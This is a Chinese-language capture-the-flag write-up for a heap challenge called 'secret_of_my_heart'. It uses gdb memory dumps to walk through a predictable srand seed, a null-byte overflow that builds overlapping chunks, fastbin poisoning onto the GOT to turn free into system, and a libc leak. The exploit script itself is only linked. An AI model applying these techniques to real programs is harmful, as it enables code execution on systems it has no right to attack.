## Introduction

首先來看一下檔案跟保護
```
# file secret_of_my_heart
secret_of_my_heart: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=587f33daea407dadc787134d5cb40b90c8825de7, not stripped
# checksec secret_of_my_heart
[*] '/root/ctf/edu_ctf/pwn/secret_of_my_heart/secret_of_my_heart'
   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    Canary found
   NX:       NX enabled
   PIE:      No PIE
```
這隻程式有簡單的5個操作
```
# ./secret_of_my_heart
==================================
        Secret of my heart
==================================
 1. Add a secret
 2. show a secret
 3. delete a secret
 4. Exit
==================================
Your choice :
```

1. Add a secret
    * read(0, size, 15);
    * malloc(size);
    * read(0, name, 32);
    * read(0, secret, size);
2. show a secret
    * print()
3. delete a secret
    * free()
4. quit()
4869. 4869:get_the_secret
    * print list address

看起來就是一臉heap樣

## Vulnerbility

### unsafe srand

由於有給原始碼，所以稍微看一下main()有執行一個`init_proc()`

```
void init_proc(){
	int addr = 0;
	setvbuf(stdout,0,2,0);
	setvbuf(stdin,0,2,0);
	srand(time(NULL));
	while(addr <= 0x10000){
		addr = rand() & 0xfffff000;
	}
	list = mmap(addr,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS ,-1,0);
	if(list == -1){
		puts("mmap error");
		exit(0);
	}
}
```

可以看到list是由mmap()分配的一塊空間，而這塊空間是rand()出來的

而且srand的種子是用time()，如果我們同時連上2個session

第一個session執行4869選項取得list address，

由於time()時間一樣，所以第二個session的list會同上!!!

### shrink the chunk

在malloc()的機制裡面，當你

malloc(0x60) 跟 malloc(0x68) 其實是會分配到同一塊address

基於這個概念

我們首先 add 3個secret，size分別是0x40,0x100,0xf0，並把size 0x100的刪掉

這時候的heap 會長這樣 (中間許多空白省略XDDD)
```
gdb-peda$ x/100gx 0x00603000
0x603000:	0x0000000000000000	0x0000000000000051
0x603010:	0x3131313131313131	0x3131313131313131 <- chunk1
0x603020:	0x3131313131313131	0x3131313131313131
0x603030:	0x3131313131313131	0x3131313131313131
0x603040:	0x3131313131313131	0x3131313131313131
0x603050:	0x0000000000000000	0x0000000000000111
0x603060:	0x00007ffff7dd67b8	0x00007ffff7dd67b8 <- chunk2
                        ...
0x603160:	0x0000000000000110	0x0000000000000100 <- prev_size,size
0x603170:	0x3333333333333333	0x3333333333333333 <- chunk3
                        ...
0x603260:	0x0000000000000000	0x0000000000020da1
```
然後在刪除掉size 0x40的secret，在add一個size 0x48的secret

由於剛剛的概念我們知道0x48會分配到跟0x40一樣的address

但是由於size多了8個byte所以可以寫到size 0x100的prev_size

加上會在最後補一個null byte所以會把size 0x100的size覆蓋掉，like this:

```
gdb-peda$ x/100gx 0x00603000
0x603000:	0x0000000000000000	0x0000000000000051
0x603010:	0x3131313131313131	0x3131313131313131 <- chunk1
0x603020:	0x3131313131313131	0x3131313131313131
0x603030:	0x3131313131313131	0x3131313131313131
0x603040:	0x3131313131313131	0x3131313131313131
0x603050:	0x3131313131313131	0x0000000000000100 <- 原本是0x111被改成0x100
0x603060:	0x00007ffff7dd67b8	0x00007ffff7dd67b8 <- chunk2
                        ...
0x603160:	0x0000000000000110	0x0000000000000100
0x603170:	0x3333333333333333	0x3333333333333333 <- chunk3
                        ...
0x603260:	0x0000000000000000	0x0000000000020da1
```
再來看看heapinfo
```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x603260 (size : 0x20da0)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x603050 (size : 0x100)
```

unsortbin的chunk size被看成是0x100了，但是在看看chunk3的prev_size還是原本的0x110

這中間一共少了0x10個byte!!!接下來要利用這騙過glibc做出一個overlap chunk達到任意malloc!!!

現在我們已經有一個size壞掉的unsortbin了接下來我們add一塊small bin大小的secret

p.s 由於size必須要大於0x90才會是small bin!!!

```
malloc(0x90)
```
由於unsortbin有一塊空的chunk所以這次malloc將會從unsortbin分配出來
```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x603260 (size : 0x20da0)
       last_remainder: 0x6030f0 (size : 0x60)
            unsortbin: 0x6030f0 (size : 0x60)
```
分配完之後的unsotrbin變這樣，空間還有0x60

這邊有個小小的地方需要注意雖然是malloc(0x90)，但實際上分配到的chunk size會是0x90+0x10

多出來的0x10是prev_size跟size!!所以unsortbin才會剩下0x60的空間(0x100-(0x90+0x10))

由於空間只剩0x60所以只能在malloc一塊size 0x50的chunk

然後依序把size 0x90跟size 0xf0的secret刪除掉
```
gdb-peda$ x/100gx 0x00603000
0x603000:	0x0000000000000000	0x0000000000000051
0x603010:	0x3131313131313131	0x3131313131313131 <- chunk1
0x603020:	0x3131313131313131	0x3131313131313131
0x603030:	0x3131313131313131	0x3131313131313131
0x603040:	0x3131313131313131	0x3131313131313131
0x603050:	0x3131313131313131	0x0000000000020fb1 <- top chunk
0x603060:	0x00007ffff7dd67b8	0x00007ffff7dd67b8 <- 原本的chunk2
                        ...
0x6030f0:	0x00000000000000a0	0x0000000000000060
0x603100:	0x3333333333333333	0x3333333333333333 <- chunk4
0x603110:	0x3333333333333333	0x3333333333333333
0x603120:	0x0000000000000033	0x0000000000000000
0x603130:	0x0000000000000000	0x0000000000000000
0x603140:	0x0000000000000000	0x0000000000000000
0x603150:	0x0000000000000060	0x0000000000000001 <- unsortbin
0x603160:	0x0000000000000110	0x0000000000000100
0x603170:	0x3333333333333333	0x0000003333333333 <- chunk3
                        ...
0x603260:	0x0000000000000000	0x0000000000020da1
```
由於chunk3的prev_size是0x110所以前一個chunk會是原本的chunk2

而剛剛我們已經先刪除size 0x90(chunk2)在刪除size 0xf0(chunk3)

而chunk3會用prev_size找前一個chunk(chunk2)發現他已經是free的而做unlink將整塊合併

但是實際上chunk4還沒有被free掉，所以我們成功騙過glibc造成overlap chunk

接下來有個問題，因為要控制到chunk4所以要先將她刪除再新增

所以必須要先malloc一塊0x100的secret並且覆蓋掉chunk4(prev_size跟size要還原)

然後把unsortbin殘留的prev_size=0x60(即chunk4的size，因為chunk4在free時會來這塊檢查)，

size=0x11，由於glibc在free會檢查size是否>0x10如果保持原本的0x1將會raise

覆蓋掉unsortbin的size成0x11之後把剛剛新增的size 0x100刪除掉

再把chunk4刪除，此時就可以成功刪除(往下一個chunk檢查size>0x10)

由於刪除chunk4了所以這上面會有一個0x60大小的fastbin

之後再新增一個size 0x100的secret，並把原本的chunk4還原回去，

別忘了還有chunk4的下一個chunk的size也要寫成0x10
```
0x6030f0:	0x0000000000000000	0x0000000000000060
0x603100:   0x6161616161616161
gdb-peda$ heapinfo 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x6030f0 --> 0x6161616161616161 (invaild memory)
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x603160 (size : 0x20ea0) 
       last_remainder: 0x6030f0 (size : 0x60) 
            unsortbin: 0x0
```
因為chunk4上面是size 0x60的fastbin然後我們新增的secret又可以覆蓋過去所以我們就控制到fastbin的值

當之後第二次malloc(0x50)的時候就會分配到0x6161616161616161當然這是一個錯誤的位址，我們必須找一個合法的位址

之所以選用0x50是因為got table上就有一個0x60可以當size來通過檢查
```
gdb-peda$ x/2gx 0x00602000-0x6
0x601ffa:	0x1e28000000000000	0xe148000000000060
```
而且他後面有free，可以直接修改free成system做got hijack!!
```
gdb-peda$ x/20gx 0x00602000
0x602000:	0x0000000000601e28	0x00007ffff7ffe148
0x602010:	0x00007ffff7df2070	0x00007ffff7a9c370 <- free.got
```

### information leak

最後我們缺少了lib base，但是我們剛剛可以任意malloc的狀況下，

可以將malloc在list上，因為show時會去list+0x28的地方取出heap address然後輸出內容
```
0x48c68000:	0x0000000000000048	0x0000000000000031
0x48c68010:	0x0000000000000000	0x0000000000000000
0x48c68020:	0x0000000000000000	0x0000000000603010 <- heap address
```
所以我們第一次malloc就讓他在list上改掉0x28的pointer，leak出libc base!!

最後~~ 因為我們的fastbin指到list上所以我們在一開始add第一筆secret時就要先把got table跟

fastbin size先寫上去，當malloc在list上時fastbin的下一個值又會是我們控制的了!!!

[payload](exp.rb)
